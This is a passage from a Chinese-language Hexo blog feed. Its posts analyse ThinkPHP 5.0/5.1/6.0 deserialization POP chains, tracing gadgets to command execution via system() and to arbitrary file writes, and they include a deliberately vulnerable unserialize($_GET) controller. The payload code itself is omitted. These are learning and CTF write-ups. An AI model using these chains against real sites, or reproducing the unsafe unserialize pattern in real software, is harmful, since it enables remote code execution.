class="hljs shell">b&#x27;\x80\x03c__main__\nplay\n&#125;(Vname\nVcurry\nVpoints\nV60\nub0\x80\x03c__main__\nplayer\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x05\x00\x00\x00curryq\x04X\x06\x00\x00\x00pointsq\x05X\x02\x00\x00\x0060q\x06ub.&#x27;<br></code></pre></td></tr></table></figure><p>参考：<a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>python反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tp6.0.x反序列化</title>
    <link href="/2020/06/06/tp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/06/06/tp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>直接白嫖安洵杯iamthinking的源码，开搞</p><h2 id="0x02-POP链分析"><a href="#0x02-POP链分析" class="headerlink" title="0x02 POP链分析"></a>0x02 POP链分析</h2><p>全局搜__destruct()，发现windows类不见了，找一下其他类，找到Model类，它比之前多了个__destruct()</p><p><img src="https://i.loli.net/2020/06/06/l4bOnK9eWXwYJfN.png"></p><p>跟进save()</p><p><img src="https://i.loli.net/2020/06/06/NPgeMVhUniAo3ab.png"></p><p>调用了几个函数，重点在updateData()，继续跟进</p><p><img src="https://i.loli.net/2020/06/06/Jyxc31IvuOVibhl.png"></p><p>再跟进db()</p><p><img src="https://i.loli.net/2020/06/06/pV3dn5hUqOCkj7R.png"></p><p>发现了熟悉的字符串拼接，后面就和tp5.1.x的链子一样了，最终实现RCE。</p><h2 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h2><p>首先要构造一下一些参数，使反序列化后按照我们的思路执行。</p><p>先是save()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;isEmpty() || <span class="hljs-literal">false</span> === <span class="hljs-keyword">$this</span>-&gt;trigger(<span class="hljs-string">&#x27;BeforeWrite&#x27;</span>)) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br><br>      <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;exists ? <span class="hljs-keyword">$this</span>-&gt;updateData() : <span class="hljs-keyword">$this</span>-&gt;insertData(<span class="hljs-variable">$sequence</span>);<br><br></code></pre></td></tr></table></figure><p>要执行updateData()，就不能样函数提前return,因此要构造data参数不为空，name参数不为空，exists为True</p><p>再是updateData(),重点是下面的代码段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;getChangedData();<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-comment">// 关联更新</span><br>           <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;relationWrite)) &#123;<br>               <span class="hljs-keyword">$this</span>-&gt;autoRelationUpdate();<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>getChangedData()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;force ? <span class="hljs-keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="hljs-keyword">$this</span>-&gt;data, <span class="hljs-keyword">$this</span>-&gt;origin, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>)) &amp;&amp; <span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> is_object(<span class="hljs-variable">$a</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>        &#125;);<br><br>        <span class="hljs-comment">// 只读字段不允许更新</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;readonly <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$field</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$field</span>])) &#123;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$field</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br></code></pre></td></tr></table></figure><p>将force置为True,是函数返回我们前面的data，这样就可以不提前return</p><p>回到updateData()，里面的checkAllowFields()里可以设filed为非空数组。</p><p>于是就可以进到db()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/** <span class="hljs-doctag">@var</span> Query $query */</span><br>      <span class="hljs-variable">$query</span> = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$db</span>-&gt;connect(<span class="hljs-keyword">$this</span>-&gt;connection)<br>          -&gt;name(<span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-keyword">$this</span>-&gt;suffix)<br>          -&gt;pk(<span class="hljs-keyword">$this</span>-&gt;pk);<br><br></code></pre></td></tr></table></figure><p>设置connection为mysql,name为一个执行后续toString()的类，就OK了</p><p>实现代码可以在原来tp5.1.x的基础上加上刚才讲到的一些参数，置好值，就可以打了。</p><h2 id="0x04-攻击效果"><a href="#0x04-攻击效果" class="headerlink" title="0x04 攻击效果"></a>0x04 攻击效果</h2><p><img src="https://i.loli.net/2020/06/06/nXiO4qlNTpveSU9.png"></p><p>本地打通了，但是直接拿着payload去打题目会没回显，想了一下，应该是我在配置参数的时候没有弄好属性，全部都设为了public,本地能通是因为本地的PHP版本较高，对属性的要求不高。而题目的PHP版本为PHP7.2，要区别好属性。</p>]]></content>
    
    
    
    <tags>
      
      <tag>tp6</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tp5.1.x反序列化</title>
    <link href="/2020/06/06/tp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/06/06/tp5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>linux+php7.3+apache2</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">composer create-project topthink/think=5.1.*-dev tp5.1<br>cd tp5.1<br>service apache2 start<br></code></pre></td></tr></table></figure><h2 id="0x02-POP链分析"><a href="#0x02-POP链分析" class="headerlink" title="0x02 POP链分析"></a>0x02 POP链分析</h2><p>一开始的链子入口没有变，和tp5.0.x的一样，Windows类</p><p><img src="https://i.loli.net/2020/06/06/eYVQUAlj4ihGtZz.png"></p><p>搜搜__toString()方法，发现不再是Model类了，取而代之的是两个Trait</p><h3 id="Trait"><a href="#Trait" class="headerlink" title="Trait"></a>Trait</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">自 PHP <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span> 起，PHP 实现了一种代码复用的方法，称为 trait。 <br><br>Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 <span class="hljs-function"><span class="hljs-keyword">method</span>。<span class="hljs-title">Trait</span> 和 <span class="hljs-title">Class</span> 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 <span class="hljs-title">Mixin</span> 类相关典型问题。 </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Trait</span> 和 <span class="hljs-title">Class</span> 相似，但仅仅旨在用细粒度和一致的方式来组合功能。无法通过 <span class="hljs-title">trait</span> 自身来实例化。它为传统继承增加了水平特性的组合；也就是说，应用的几个 <span class="hljs-title">Class</span> 之间不需要继承。 </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>刚好Model类use了其中一个trait，所以还是可以用Model类。</p><p><img src="https://i.loli.net/2020/06/06/Ez7VO8rgt3BUkxH.png"></p><p>再看看Conversion.php，toArray()方法有变化，看到有两个利用点。</p><p><img src="https://i.loli.net/2020/06/06/oBcvVZ8ubGl6fwi.png"></p><p>第一个visible()应该可以接上5.0.x后半段的链子，实现任意文件生成（还没尝试）</p><p>看看第二个点，文件中搜不到该方法，全局搜一下，在Attribute.php找到，并看到了RCE点</p><p><img src="https://i.loli.net/2020/06/06/nTkA8tFv1EgRVZz.png"></p><p>可以动态执行函数，令withAttr[$filename] = ‘system’, $value = ‘payload’,就可以执行系统命令了，而第二个参数$this-&gt;data不影响函数执行</p><p><img src="https://i.loli.net/2020/06/06/C5QEJGRmVe9wIjs.png"></p><p>其中 command为要执行的命令，return_var用于存放执行结果。</p><p>value从getData()里来，再看看这个函数</p><p><img src="https://i.loli.net/2020/06/06/Nd1WOCcqZYRFfal.png"></p><p>可以控制this-&gt;data[$name]，从而控制value。由此这条链就分析完毕</p><h2 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h2><p>……</p><h2 id="0x04-效果"><a href="#0x04-效果" class="headerlink" title="0x04 效果"></a>0x04 效果</h2><p><img src="https://i.loli.net/2020/06/06/nrol5f9sRyQajWv.png"></p><p>参考[<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA]">https://nikoeurus.github.io/2019/12/31/ThinkPHP%205.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA]</a>(<a href="https://nikoeurus.github.io/2019/12/31/ThinkPHP">https://nikoeurus.github.io/2019/12/31/ThinkPHP</a> 5.1.x反序列化/#环境搭建)</p>]]></content>
    
    
    
    <tags>
      
      <tag>tp5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tp5.0.x反序列化</title>
    <link href="/2020/06/05/tp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/06/05/tp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>linux+php7.3+thinkphp5.0.24</p><p>tp5.0.24源码下载地址：<a href="http://www.thinkphp.cn/donate/download/id/1279.html">http://www.thinkphp.cn/donate/download/id/1279.html</a></p><p>下载好后修改application/index/controller/Index.php里代码,反序列前加个base64解码是为了防止有些属性为protecte或private，传参会出现点问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome thinkphp 5.0.24&quot;</span>;<br>        <span class="hljs-variable">$c</span> = unserialize(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]));<br>        var_dump(<span class="hljs-variable">$c</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x02-POP链分析"><a href="#0x02-POP链分析" class="headerlink" title="0x02 POP链分析"></a>0x02 POP链分析</h2><p>POP链的入口一般为__destruct()，全局搜索后存在该方法的文件有这些，</p><p><img src="https://i.loli.net/2020/06/05/PezIWdY6cQRTth9.png"></p><p>一个一个查看，大多数都是调用了close()，free()等方法，在windows.php里发现有个removeFiles()，跟进看看</p><p><img src="https://i.loli.net/2020/06/05/6cZxPDgasNnHmEf.png"></p><p>调用file_exists()方法，控制filename就能触发___toString()，再来搜一下___toString()方法，找到了一个model类，可是它是个抽象类，无法实现（先不管），它的__toString调用tojson()方法，在tojson()中调用toArray()</p><p><img src="https://i.loli.net/2020/06/05/thCsN7exEgMUABT.png"></p><p>再看看toArray()</p><p><img src="https://i.loli.net/2020/06/05/vfQeJaw2yWZNT9R.png"></p><p>这三处可以调用__call()方法，选择第三个作为调用跳板，那就要构造一下条件，让函数执行到该处。</p><p>1.要进入该分支，先对append设值。</p><p><img src="https://i.loli.net/2020/06/05/89jY7TkBWZdsEyC.png"></p><p>然后是比较重要的两行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$modelRelation</span> = <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br><span class="hljs-variable">$value</span>= <span class="hljs-keyword">$this</span>-&gt;getRelationData(<span class="hljs-variable">$modelRelation</span>);<br></code></pre></td></tr></table></figure><p>$value是我们需要的值，而$modelRelation是执行需要构建的条件。</p><p>首先modelRelation需要存在getBindAttr方法，全局搜索该方法在OnetoOne.php里找到这个方法。</p><p><img src="https://i.loli.net/2020/06/05/4l3KRdinmBOMILV.png"></p><p>可是这个类也是个抽象类，找找他的子类，找到了HaveOne.php，bindAttr可控</p><p><img src="https://i.loli.net/2020/06/05/xD5GWoKmTJE9VdM.png"></p><p>再看modelRelation是怎么来的，是由$this-&gt;$relation赋值，注意是$relation，而不是relation，这里控制$relation为getError,调用方法，返回一个HasOne类</p><p><img src="https://i.loli.net/2020/06/05/YayM18f9wkZO45G.png"></p><p>再来value = this-&gt;getRelationData(),</p><p><img src="https://i.loli.net/2020/06/05/ga5DZMGpJKH8fnA.png"></p><p>看了看之前的hasone类，恰好存在这个方法，并且query似乎可以直接利用啊，调用__call()方法</p><p><img src="https://i.loli.net/2020/06/05/CHhckZ9KLIEGDie.png"></p><p>来到Ouput.php，</p><p><img src="https://i.loli.net/2020/06/05/eHdncQFpZCAWNq7.png"></p><p>利用block方法，一步一步调用file_put_contents()</p><p><img src="https://i.loli.net/2020/06/05/79K5zH3rohMV1pu.png"></p><p><img src="https://i.loli.net/2020/06/05/ZYQJIGfquKivEos.png"></p><p><img src="https://i.loli.net/2020/06/05/HvV2iKmz5rsuUoj.png"></p><p>这里的handle可控，全局搜下write方法，Memcached.php里</p><p><img src="https://i.loli.net/2020/06/05/f9hRTJZDmasGqOr.png"></p><p>调用set方法，最终再file.php里调用file_put-contents()方法</p><p><img src="https://i.loli.net/2020/06/05/geuGU4ZomLytrSh.png"></p><p>最后找一下Model的子类</p><p><img src="https://i.loli.net/2020/06/05/NZOeRuDWV3s7xMc.png"></p><h2 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h2><p>….</p><h2 id="0x04-效果"><a href="#0x04-效果" class="headerlink" title="0x04 效果"></a>0x04 效果</h2><p>注意，因为生成的文件名带有一些特殊符号，在window环境下无法生成成功，所以要换到linux环境下才能执行成功</p><p>可不知道为什么我本地生成的文件名会被单引号包裹</p><p><img src="https://i.loli.net/2020/06/05/DykioT2MxbXudGF.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>tp5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/06/04/hello-world/"/>
    <url>/2020/06/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
